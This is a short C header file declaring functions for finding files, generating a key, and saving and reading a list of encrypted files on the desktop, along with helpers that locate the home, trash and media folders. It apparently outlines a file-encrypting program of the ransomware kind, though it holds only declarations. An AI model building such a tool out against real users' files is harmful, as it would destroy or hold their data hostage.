
#ifndef FUNC
#define FUNC

#include<stdio.h>
#include<stdlib.h>
#include<stdbool.h>
#include "struct.h"
void find_files(List **files, char* start_path);
void save_into_file_encrypted_list(List *l, char * desktop);
void read_from_file_encrypted_files(List **l, char * desktop);
const char *get_filename_ext(const char *filename);
char * get_home_enviroment();
char * get_username();
char * get_trash_path(char * home);
char * get_media_path(char * username);
char * get_desktop_enviroment(char *home);
char * generate_key(int length);
char * get_test_path(char * desktop);
bool is_path(char *path);
#endif
